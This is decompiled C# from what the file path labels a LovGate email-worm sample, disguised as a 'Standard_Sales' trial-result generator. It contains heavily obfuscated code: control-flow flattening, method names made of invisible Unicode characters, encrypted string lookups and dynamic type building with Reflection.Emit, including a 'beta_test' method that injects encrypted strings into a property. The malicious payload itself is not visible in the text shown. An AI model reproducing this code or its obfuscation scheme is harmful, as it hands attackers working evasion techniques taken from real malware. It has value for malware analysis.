// Decompiled with JetBrains decompiler
// Type: Standard_Sales.TypeGenerator.TrialResultGenerator
// Assembly: PreAllocatedOverlap, Version=1.0.2.1, Culture=neutral, PublicKeyToken=null
// MVID: B92242D0-7BA9-445E-B92A-42A0AEAC877F
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Email-Worm.MSIL.LovGate.gen-514cb032bdc969f3ffe7822a716534d8e477f161e0d12f70225b72524e53bc11.exe

using Standard_Sales.ExcelImport;
using System;
using System.Collections.Generic;
using System.Reflection;
using System.Reflection.Emit;
using System.Runtime.InteropServices;
using System.Threading;

namespace Standard_Sales.TypeGenerator
{
  public class TrialResultGenerator : ITrialResultGenerator
  {
    public static void beta_test(object ATA)
    {
label_1:
      int num1 = 1361636350;
      PropertyInfo propertyInfo;
      string[] strArray;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 372465929)) % 5U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num2 * -1434398324 ^ 1736395201;
            continue;
          case 2:
            goto label_3;
          case 3:
            propertyInfo = TrialResultGenerator.\u202E⁪‮⁫​⁪⁪‍​‌‭⁯⁯⁬‮⁫‎⁬‪​⁯⁫⁯‭‫‍‫‬‬‎⁪‭⁪​⁭‪⁪⁮​‌‮((Type) ATA)[0];
            strArray = new string[3];
            num1 = (int) num2 * -646824208 ^ -56502072;
            continue;
          case 4:
            strArray[0] = \u003CModule\u003E.\u206B‏⁮‭⁬⁭‪‌​‮⁪‬‎⁪​​⁭‮⁬‪⁭‭‪‬⁬‮⁫⁫‮‎‮‏‫⁬⁪‌⁬‌‏⁫‮<string>(3682179738U);
            strArray[1] = \u003CModule\u003E.\u202E⁫⁬⁬⁯‪‏​‍‏⁯‎⁪​‌‭⁪⁯‌‏‏​⁪‮‎‮‌​‪‍‏​‪‪⁫‬‪‮⁫‭‮<string>(1727372675U);
            strArray[2] = \u003CModule\u003E.\u206B‏⁮‭⁬⁭‪‌​‮⁪‬‎⁪​​⁭‮⁬‪⁭‭‪‬⁬‮⁫⁫‮‎‮‏‫⁬⁪‌⁬‌‏⁫‮<string>(609629479U);
            TrialResultGenerator.\u200E⁬‫⁮‪⁪‮‮‭‮⁬⁪⁯⁯‌​‭​‮​⁯‮‭⁫‪‎‍‭‫‌‎‪‪⁪‬‫‭⁭⁫‏‮(propertyInfo, (object) null, (object) strArray, (object[]) null);
            num1 = (int) num2 * 1720718117 ^ -1762960245;
            continue;
          default:
            goto label_7;
        }
      }
label_3:
      return;
label_7:;
    }

    public List<object> GenerateTrialResult(ExcelDataSet dataSet)
    {
      List<object> objectList = new List<object>();
      object[] values1 = (object[]) dataSet.TrialDataRows[0].Values;
label_1:
      int num1 = -1891114483;
      Type type1;
      List<object> trialResult;
      object obj;
      int index;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -891064730)) % 12U)
        {
          case 0:
            goto label_1;
          case 1:
            int num3;
            num1 = num3 = index < dataSet.TrialDataRows.Count ? -584861312 : (num3 = -1200239477);
            continue;
          case 2:
            num1 = (int) num2 * 372078961 ^ -1161439489;
            continue;
          case 3:
            type1 = TrialResultGenerator.GenerateType(values1);
            num1 = (int) num2 * 237540241 ^ 1910815696;
            continue;
          case 4:
            num1 = (int) num2 * 233780689 ^ 1180210771;
            continue;
          case 5:
            index = 1;
            num1 = (int) num2 * 800066079 ^ -1205152631;
            continue;
          case 6:
            Type type2 = type1;
            values1 = (object[]) dataSet.TrialDataRows[index].Values;
            object[] values2 = values1;
            obj = TrialResultGenerator.GenerateObject(type2, values2);
            num1 = -1696483102;
            continue;
          case 7:
            ++index;
            num1 = (int) num2 * -478829662 ^ -637674767;
            continue;
          case 8:
            objectList.Add(obj);
            num1 = (int) num2 * -226978266 ^ 1768251448;
            continue;
          case 9:
            trialResult = objectList;
            num1 = (int) num2 * 1600612396 ^ -366520100;
            continue;
          case 10:
            num1 = (int) num2 * -900771576 ^ 581399321;
            continue;
          default:
            goto label_13;
        }
      }
label_13:
      return trialResult;
    }

    private static object GenerateObject(Type type, object[] values)
    {
label_1:
      int num1 = -627764176;
      int index;
      PropertyInfo[] propertyInfoArray;
      object obj1;
      string str;
      object obj2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -62495400)) % 16U)
        {
          case 0:
            int num3;
            num1 = num3 = index < values.Length ? -1820088350 : (num3 = -487998195);
            continue;
          case 1:
            ++index;
            num1 = (int) num2 * -1503676564 ^ -164037980;
            continue;
          case 2:
            propertyInfoArray = TrialResultGenerator.\u202E⁪‮⁫​⁪⁪‍​‌‭⁯⁯⁬‮⁫‎⁬‪​⁯⁫⁯‭‫‍‫‬‬‎⁪‭⁪​⁭‪⁪⁮​‌‮(type);
            num1 = (int) num2 * -328532684 ^ -1989628620;
            continue;
          case 3:
            num1 = (int) num2 * -747601778 ^ -610417493;
            continue;
          case 4:
            index = 0;
            num1 = (int) num2 * -937534701 ^ 1005140175;
            continue;
          case 5:
            obj2 = obj1;
            num1 = (int) num2 * -846371551 ^ 972383006;
            continue;
          case 6:
            TrialResultGenerator.\u200E⁬‫⁮‪⁪‮‮‭‮⁬⁪⁯⁯‌​‭​‮​⁯‮‭⁫‪‎‍‭‫‌‎‪‪⁪‬‫‭⁭⁫‏‮(propertyInfoArray[index], obj1, (object) str, (object[]) null);
            num1 = -1777660391;
            continue;
          case 7:
            num1 = (int) num2 * 721981518 ^ -1886855076;
            continue;
          case 8:
            obj1 = TrialResultGenerator.\u206F‏⁬⁮‎⁯‏‌⁮‌⁯⁯‎⁮⁭⁮⁫⁪‏‏‬⁬​‎⁯‫‌‎‫‌⁭‏‮‎‫‎⁫‬⁯‌‮(type);
            num1 = (int) num2 * 218283177 ^ -1303207678;
            continue;
          case 10:
            num1 = -637647259;
            continue;
          case 11:
            num1 = (int) num2 * 1300162941 ^ -2064207513;
            continue;
          case 12:
            goto label_1;
          case 13:
            str = (string) null;
            num1 = (int) num2 * -10242810 ^ -792761415;
            continue;
          case 14:
            str = TrialResultGenerator.\u206E‭‮​⁫‌‌‌‪⁪‎⁮⁮‫‍⁮⁬⁫‭‭⁯‭‍‭‬‌⁭‪‬​⁭‮⁭​⁭⁮⁪‍‪‮(values[index]);
            num1 = (int) num2 * -109392008 ^ -1444037793;
            continue;
          case 15:
            int num4 = values[index] != null ? -1288408906 : (num4 = -1549035682);
            num1 = num4 ^ (int) num2 * -189576960;
            continue;
          default:
            goto label_17;
        }
      }
label_17:
      return obj2;
    }

    private static Type GenerateType(object[] properties)
    {
label_1:
      int num1 = -1071172105;
      ILGenerator ilGenerator1;
      FieldBuilder fieldBuilder;
      TypeBuilder typeBuilder;
      MethodAttributes methodAttributes;
      MethodBuilder methodBuilder1;
      AssemblyName assemblyName;
      ILGenerator ilGenerator2;
      PropertyBuilder propertyBuilder;
      MethodBuilder methodBuilder2;
      object[] objArray;
      string str;
      object obj;
      int index;
      AssemblyBuilder assemblyBuilder;
      Type type;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1077085647)) % 27U)
        {
          case 0:
            num1 = (int) num2 * -61564514 ^ -2050087637;
            continue;
          case 1:
            index = 0;
            num1 = (int) num2 * -907501369 ^ 542019110;
            continue;
          case 2:
            obj = objArray[index];
            num1 = -1169096645;
            continue;
          case 3:
            num1 = (int) num2 * 34509374 ^ 947386620;
            continue;
          case 5:
            typeBuilder = TrialResultGenerator.\u202C‮⁭⁯⁬‫⁮‮⁭‏‮‌‏‏⁯‮⁯‌⁮⁭​⁮⁯⁫‌⁬‌‌‪⁫‪‏‍‪‫⁪‏⁯‏⁭‮(TrialResultGenerator.\u206B‮‌⁭‬‏⁮⁫‌‏‫‌‏‎‏⁭‏⁫‮⁭‮⁮‮‏‌⁫⁭⁪​⁫‌⁪‮⁮⁬‍⁮‫‎‏‮(assemblyBuilder, \u003CModule\u003E.\u206F‌⁮​‫‫‮‬⁭⁬⁫⁮⁫⁭‌‮‌‏‬​⁭⁫‪​‫‮‬‫‬⁪⁬‍‍‮‬⁯‮‏‌‮‮<string>(3883913907U)), \u003CModule\u003E.\u202E⁫⁬⁬⁯‪‏​‍‏⁯‎⁪​‌‭⁪⁯‌‏‏​⁪‮‎‮‌​‪‍‏​‪‪⁫‬‪‮⁫‭‮<string>(1635094616U), TypeAttributes.Public);
            num1 = (int) num2 * 446978994 ^ -228358603;
            continue;
          case 6:
            goto label_1;
          case 7:
            TrialResultGenerator.\u202E‏⁫‎‎‎⁭⁭​⁭⁭‫‫‮‏‮⁮‎‮⁭‍‌⁯​‪‏‭‭‎‌‫‭⁬⁯⁯⁪‏‎​‬‮(assemblyName, \u003CModule\u003E.\u200B‫‫‫⁯⁫‫‫⁬‪‪​‫⁮⁪⁪⁭‬‮⁬​‪‍‎‏⁫‬⁫‫‬‬⁫‭‍‏⁯‪⁪‫‮‮<string>(2774142196U));
            num1 = (int) num2 * 1883772243 ^ -2083124858;
            continue;
          case 8:
            str = TrialResultGenerator.\u206E‭‮​⁫‌‌‌‪⁪‎⁮⁮‫‍⁮⁬⁫‭‭⁯‭‍‭‬‌⁭‪‬​⁭‮⁭​⁭⁮⁪‍‪‮(obj);
            // ISSUE: type reference
            fieldBuilder = TrialResultGenerator.\u200D‏‍⁭⁭⁫‏⁪‍‪⁫‌‭⁬‮⁪⁯⁪‬‪‏‏⁮‏⁪⁭⁭⁬⁫⁭⁪⁪‪‍⁮⁮​​‮‎‮(typeBuilder, TrialResultGenerator.\u200C⁪‎⁫‭​⁬‎‭‎‌‍‫‪⁬⁪‎⁯⁬‏⁬⁯‌⁭⁮‍⁪⁪⁭‮‍⁯⁫⁪‌‎‪‪⁭‭‮(\u003CModule\u003E.\u200B‫‫‫⁯⁫‫‫⁬‪‪​‫⁮⁪⁪⁭‬‮⁬​‪‍‎‏⁫‬⁫‫‬‬⁫‭‍‏⁯‪⁪‫‮‮<string>(873443844U), str), TrialResultGenerator.\u206E⁬⁬‎​‍‮⁭⁭‎‏⁭‎⁪‪‮​‍‪⁪​‏‫⁮‭‏⁪‍⁫⁪‌⁪‍‫‪‫⁬⁮‏⁪‮(__typeref (string)), FieldAttributes.Private);
            num1 = (int) num2 * 121651871 ^ -292284877;
            continue;
          case 9:
            TrialResultGenerator.\u206A‎⁪⁭⁮⁫⁬‎‬⁫‪‮‮⁫‎‍‭⁫⁬⁬​‭⁫⁮‮‎‭‌‭‍‫⁯⁪⁬‮⁭‍⁮⁯⁬‮(ilGenerator2, OpCodes.Ret);
            TrialResultGenerator.\u206A‍‌​‪⁭‮⁪​‭‪⁭‎⁬⁪‫⁯‏‌​‎‮‬⁬‬‍‫‬‪⁮⁪⁫​‌‏‌‭‬‍⁫‮(propertyBuilder, methodBuilder2);
            num1 = (int) num2 * -541328110 ^ -1299337693;
            continue;
          case 10:
            int num3;
            num1 = num3 = index < objArray.Length ? -6071963 : (num3 = -182052781);
            continue;
          case 11:
            // ISSUE: type reference
            // ISSUE: type reference
            propertyBuilder = TrialResultGenerator.\u206D⁬‮‍‌‮⁯‭‫‪‭⁭⁭‮⁬‎‭⁮⁪​‮‎‌‮‎‎‌⁪‫‫⁬​‮⁮⁮‏‭⁬⁫‪‮(typeBuilder, str, PropertyAttributes.None, TrialResultGenerator.\u206E⁬⁬‎​‍‮⁭⁭‎‏⁭‎⁪‪‮​‍‪⁪​‏‫⁮‭‏⁪‍⁫⁪‌⁪‍‫‪‫⁬⁮‏⁪‮(__typeref (string)), new Type[1]
            {
              TrialResultGenerator.\u206E⁬⁬‎​‍‮⁭⁭‎‏⁭‎⁪‪‮​‍‪⁪​‏‫⁮‭‏⁪‍⁫⁪‌⁪‍‫‪‫⁬⁮‏⁪‮(__typeref (string))
            });
            methodAttributes = MethodAttributes.Public | MethodAttributes.HideBySig;
            // ISSUE: type reference
            methodBuilder2 = TrialResultGenerator.\u200D⁭‭⁯‬⁪⁬⁮‎‮‎⁪⁯⁪⁭⁬​‌‍‪⁭​​⁬‮‪‭‪⁯⁯‮‬⁯⁪⁭‬​‍‫‌‮(typeBuilder, \u003CModule\u003E.\u206F‌⁮​‫‫‮‬⁭⁬⁫⁮⁫⁭‌‮‌‏‬​⁭⁫‪​‫‮‬‫‬⁪⁬‍‍‮‬⁯‮‏‌‮‮<string>(2223718808U), methodAttributes, TrialResultGenerator.\u206E⁬⁬‎​‍‮⁭⁭‎‏⁭‎⁪‪‮​‍‪⁪​‏‫⁮‭‏⁪‍⁫⁪‌⁪‍‫‪‫⁬⁮‏⁪‮(__typeref (string)), Type.EmptyTypes);
            ilGenerator1 = TrialResultGenerator.\u200B⁭‬‍⁯‏‮‍‍‌‎‭⁭⁬⁬⁫⁮⁯⁪⁪‍⁭‌‌⁮‬​⁬‪⁫⁬‬‫‬‭‏⁮‍‏‮‮(methodBuilder2);
            num1 = (int) num2 * 93826900 ^ 1273087431;
            continue;
          case 12:
            assemblyBuilder = TrialResultGenerator.\u202E⁬⁭⁪‌​‭‮​‪‫⁪‮‮‏‭⁯‌‬​⁮⁭⁪‬‮⁭‌‎‍‬⁭‌⁪‮‪‭⁬‏⁮‫‮(TrialResultGenerator.\u206D‏‎⁯‫‮​‬‌‌⁯⁯‍​‭‌‭‍⁯‍‎⁫​​⁭⁫⁬‬‌⁪‍‬‪‌‍‍​‪⁫‬‮(), assemblyName, AssemblyBuilderAccess.Run);
            num1 = (int) num2 * 125231330 ^ -1820515783;
            continue;
          case 13:
            TrialResultGenerator.\u200C‎⁬⁪‌⁯‭‎‮⁮⁪⁬⁬⁪‮⁯⁮⁯⁮‭‌⁬⁯⁭​‪‭‍⁮‏⁭‬‭⁯‏⁪‍‫‍‮‮(propertyBuilder, methodBuilder1);
            num1 = (int) num2 * -833043411 ^ -100493990;
            continue;
          case 14:
            type = TrialResultGenerator.\u206D⁬‪‪⁯⁯‍‮‍⁭⁫⁭‬‪⁯⁯‏⁫⁪‎⁫⁬‪⁭‌⁪‫⁭⁯⁪‫​‍‭‫‭‍‮‪⁮‮(typeBuilder);
            num1 = (int) num2 * -168751401 ^ 689434133;
            continue;
          case 15:
            // ISSUE: type reference
            methodBuilder1 = TrialResultGenerator.\u200D⁭‭⁯‬⁪⁬⁮‎‮‎⁪⁯⁪⁭⁬​‌‍‪⁭​​⁬‮‪‭‪⁯⁯‮‬⁯⁪⁭‬​‍‫‌‮(typeBuilder, \u003CModule\u003E.\u200B‫‫‫⁯⁫‫‫⁬‪‪​‫⁮⁪⁪⁭‬‮⁬​‪‍‎‏⁫‬⁫‫‬‬⁫‭‍‏⁯‪⁪‫‮‮<string>(169342026U), methodAttributes, (Type) null, new Type[1]
            {
              TrialResultGenerator.\u206E⁬⁬‎​‍‮⁭⁭‎‏⁭‎⁪‪‮​‍‪⁪​‏‫⁮‭‏⁪‍⁫⁪‌⁪‍‫‪‫⁬⁮‏⁪‮(__typeref (string))
            });
            num1 = (int) num2 * 2073693189 ^ -1795184857;
            continue;
          case 16:
            TrialResultGenerator.\u200C⁮‫‭⁮⁬‮‌⁪​⁭‭⁮‫⁭‬⁬⁯‮⁬⁫‬⁬⁭‪‏⁯‌‌‍⁯‫‫‫‎‏‌‬⁯⁮‮(ilGenerator1, OpCodes.Ldfld, (FieldInfo) fieldBuilder);
            num1 = (int) num2 * 1606135559 ^ 1673920168;
            continue;
          case 17:
            num1 = (int) num2 * -1226525648 ^ 1680591550;
            continue;
          case 18:
            TrialResultGenerator.\u206A‎⁪⁭⁮⁫⁬‎‬⁫‪‮‮⁫‎‍‭⁫⁬⁬​‭⁫⁮‮‎‭‌‭‍‫⁯⁪⁬‮⁭‍⁮⁯⁬‮(ilGenerator1, OpCodes.Ldarg_0);
            num1 = (int) num2 * 1301399605 ^ -649986227;
            continue;
          case 19:
            objArray = properties;
            num1 = (int) num2 * 1487384121 ^ -483290296;
            continue;
          case 20:
            ++index;
            num1 = (int) num2 * 697079965 ^ 636403406;
            continue;
          case 21:
            TrialResultGenerator.\u206A‎⁪⁭⁮⁫⁬‎‬⁫‪‮‮⁫‎‍‭⁫⁬⁬​‭⁫⁮‮‎‭‌‭‍‫⁯⁪⁬‮⁭‍⁮⁯⁬‮(ilGenerator1, OpCodes.Ret);
            num1 = (int) num2 * -1665336649 ^ -2127212075;
            continue;
          case 22:
            num1 = (int) num2 * -1895606467 ^ 1484396502;
            continue;
          case 23:
            ilGenerator2 = TrialResultGenerator.\u200B⁭‬‍⁯‏‮‍‍‌‎‭⁭⁬⁬⁫⁮⁯⁪⁪‍⁭‌‌⁮‬​⁬‪⁫⁬‬‫‬‭‏⁮‍‏‮‮(methodBuilder1);
            num1 = (int) num2 * 1879694167 ^ 1315375760;
            continue;
          case 24:
            TrialResultGenerator.\u206A‎⁪⁭⁮⁫⁬‎‬⁫‪‮‮⁫‎‍‭⁫⁬⁬​‭⁫⁮‮‎‭‌‭‍‫⁯⁪⁬‮⁭‍⁮⁯⁬‮(ilGenerator2, OpCodes.Ldarg_0);
            TrialResultGenerator.\u206A‎⁪⁭⁮⁫⁬‎‬⁫‪‮‮⁫‎‍‭⁫⁬⁬​‭⁫⁮‮‎‭‌‭‍‫⁯⁪⁬‮⁭‍⁮⁯⁬‮(ilGenerator2, OpCodes.Ldarg_1);
            TrialResultGenerator.\u200C⁮‫‭⁮⁬‮‌⁪​⁭‭⁮‫⁭‬⁬⁯‮⁬⁫‬⁬⁭‪‏⁯‌‌‍⁯‫‫‫‎‏‌‬⁯⁮‮(ilGenerator2, OpCodes.Stfld, (FieldInfo) fieldBuilder);
            num1 = (int) num2 * -851057082 ^ 567654239;
            continue;
          case 25:
            num1 = (int) num2 * -478314154 ^ -428723450;
            continue;
          case 26:
            assemblyName = TrialResultGenerator.\u202A⁭‏‎‎‮‮⁪⁫‫‌‍⁪‪‎‫⁭⁬‎‫⁯‍⁭⁯‏‎⁭‬‌⁬‌‍⁪‭‫‍‌⁫​‏‮();
            num1 = (int) num2 * 415450863 ^ 622339757;
            continue;
          default:
            goto label_28;
        }
      }
label_28:
      return type;
    }

    static PropertyInfo[] \u202E⁪‮⁫​⁪⁪‍​‌‭⁯⁯⁬‮⁫‎⁬‪​⁯⁫⁯‭‫‍‫‬‬‎⁪‭⁪​⁭‪⁪⁮​‌‮([In] Type obj0) => obj0.GetProperties();

    static void \u200E⁬‫⁮‪⁪‮‮‭‮⁬⁪⁯⁯‌​‭​‮​⁯‮‭⁫‪‎‍‭‫‌‎‪‪⁪‬‫‭⁭⁫‏‮(
      [In] PropertyInfo obj0,
      [In] object obj1,
      [In] object obj2,
      [In] object[] obj3)
    {
      obj0.SetValue(obj1, obj2, obj3);
    }

    static object \u206F‏⁬⁮‎⁯‏‌⁮‌⁯⁯‎⁮⁭⁮⁫⁪‏‏‬⁬​‎⁯‫‌‎‫‌⁭‏‮‎‫‎⁫‬⁯‌‮([In] Type obj0) => Activator.CreateInstance(obj0);

    static string \u206E‭‮​⁫‌‌‌‪⁪‎⁮⁮‫‍⁮⁬⁫‭‭⁯‭‍‭‬‌⁭‪‬​⁭‮⁭​⁭⁮⁪‍‪‮([In] object obj0) => obj0.ToString();

    static AssemblyName \u202A⁭‏‎‎‮‮⁪⁫‫‌‍⁪‪‎‫⁭⁬‎‫⁯‍⁭⁯‏‎⁭‬‌⁬‌‍⁪‭‫‍‌⁫​‏‮() => new AssemblyName();

    static void \u202E‏⁫‎‎‎⁭⁭​⁭⁭‫‫‮‏‮⁮‎‮⁭‍‌⁯​‪‏‭‭‎‌‫‭⁬⁯⁯⁪‏‎​‬‮([In] AssemblyName obj0, [In] string obj1) => obj0.Name = obj1;

    static AppDomain \u206D‏‎⁯‫‮​‬‌‌⁯⁯‍​‭‌‭‍⁯‍‎⁫​​⁭⁫⁬‬‌⁪‍‬‪‌‍‍​‪⁫‬‮() => Thread.GetDomain();

    static AssemblyBuilder \u202E⁬⁭⁪‌​‭‮​‪‫⁪‮‮‏‭⁯‌‬​⁮⁭⁪‬‮⁭‌‎‍‬⁭‌⁪‮‪‭⁬‏⁮‫‮(
      [In] AppDomain obj0,
      [In] AssemblyName obj1,
      [In] AssemblyBuilderAccess obj2)
    {
      return obj0.DefineDynamicAssembly(obj1, obj2);
    }

    static ModuleBuilder \u206B‮‌⁭‬‏⁮⁫‌‏‫‌‏‎‏⁭‏⁫‮⁭‮⁮‮‏‌⁫⁭⁪​⁫‌⁪‮⁮⁬‍⁮‫‎‏‮(
      [In] AssemblyBuilder obj0,
      [In] string obj1)
    {
      return obj0.DefineDynamicModule(obj1);
    }

    static TypeBuilder \u202C‮⁭⁯⁬‫⁮‮⁭‏‮‌‏‏⁯‮⁯‌⁮⁭​⁮⁯⁫‌⁬‌‌‪⁫‪‏‍‪‫⁪‏⁯‏⁭‮(
      [In] ModuleBuilder obj0,
      [In] string obj1,
      [In] TypeAttributes obj2)
    {
      return obj0.DefineType(obj1, obj2);
    }

    static string \u200C⁪‎⁫‭​⁬‎‭‎‌‍‫‪⁬⁪‎⁯⁬‏⁬⁯‌⁭⁮‍⁪⁪⁭‮‍⁯⁫⁪‌‎‪‪⁭‭‮([In] string obj0, [In] string obj1) => obj0 + obj1;

    static Type \u206E⁬⁬‎​‍‮⁭⁭‎‏⁭‎⁪‪‮​‍‪⁪​‏‫⁮‭‏⁪‍⁫⁪‌⁪‍‫‪‫⁬⁮‏⁪‮([In] RuntimeTypeHandle obj0) => Type.GetTypeFromHandle(obj0);

    static FieldBuilder \u200D‏‍⁭⁭⁫‏⁪‍‪⁫‌‭⁬‮⁪⁯⁪‬‪‏‏⁮‏⁪⁭⁭⁬⁫⁭⁪⁪‪‍⁮⁮​​‮‎‮(
      [In] TypeBuilder obj0,
      [In] string obj1,
      [In] Type obj2,
      [In] FieldAttributes obj3)
    {
      return obj0.DefineField(obj1, obj2, obj3);
    }

    static PropertyBuilder \u206D⁬‮‍‌‮⁯‭‫‪‭⁭⁭‮⁬‎‭⁮⁪​‮‎‌‮‎‎‌⁪‫‫⁬​‮⁮⁮‏‭⁬⁫‪‮(
      [In] TypeBuilder obj0,
      [In] string obj1,
      [In] PropertyAttributes obj2,
      [In] Type obj3,
      [In] Type[] obj4)
    {
      return obj0.DefineProperty(obj1, obj2, obj3, obj4);
    }

    static MethodBuilder \u200D⁭‭⁯‬⁪⁬⁮‎‮‎⁪⁯⁪⁭⁬​‌‍‪⁭​​⁬‮‪‭‪⁯⁯‮‬⁯⁪⁭‬​‍‫‌‮(
      [In] TypeBuilder obj0,
      [In] string obj1,
      [In] MethodAttributes obj2,
      [In] Type obj3,
      [In] Type[] obj4)
    {
      return obj0.DefineMethod(obj1, obj2, obj3, obj4);
    }

    static ILGenerator \u200B⁭‬‍⁯‏‮‍‍‌‎‭⁭⁬⁬⁫⁮⁯⁪⁪‍⁭‌‌⁮‬​⁬‪⁫⁬‬‫‬‭‏⁮‍‏‮‮([In] MethodBuilder obj0) => obj0.GetILGenerator();

    static void \u206A‎⁪⁭⁮⁫⁬‎‬⁫‪‮‮⁫‎‍‭⁫⁬⁬​‭⁫⁮‮‎‭‌‭‍‫⁯⁪⁬‮⁭‍⁮⁯⁬‮([In] ILGenerator obj0, [In] OpCode obj1) => obj0.Emit(obj1);

    static void \u200C⁮‫‭⁮⁬‮‌⁪​⁭‭⁮‫⁭‬⁬⁯‮⁬⁫‬⁬⁭‪‏⁯‌‌‍⁯‫‫‫‎‏‌‬⁯⁮‮(
      [In] ILGenerator obj0,
      [In] OpCode obj1,
      [In] FieldInfo obj2)
    {
      obj0.Emit(obj1, obj2);
    }

    static void \u206A‍‌​‪⁭‮⁪​‭‪⁭‎⁬⁪‫⁯‏‌​‎‮‬⁬‬‍‫‬‪⁮⁪⁫​‌‏‌‭‬‍⁫‮(
      [In] PropertyBuilder obj0,
      [In] MethodBuilder obj1)
    {
      obj0.SetGetMethod(obj1);
    }

    static void \u200C‎⁬⁪‌⁯‭‎‮⁮⁪⁬⁬⁪‮⁯⁮⁯⁮‭‌⁬⁯⁭​‪‭‍⁮‏⁭‬‭⁯‏⁪‍‫‍‮‮(
      [In] PropertyBuilder obj0,
      [In] MethodBuilder obj1)
    {
      obj0.SetSetMethod(obj1);
    }

    static Type \u206D⁬‪‪⁯⁯‍‮‍⁭⁫⁭‬‪⁯⁯‏⁫⁪‎⁫⁬‪⁭‌⁪‫⁭⁯⁪‫​‍‭‫‭‍‮‪⁮‮([In] TypeBuilder obj0) => obj0.CreateType();
  }
}
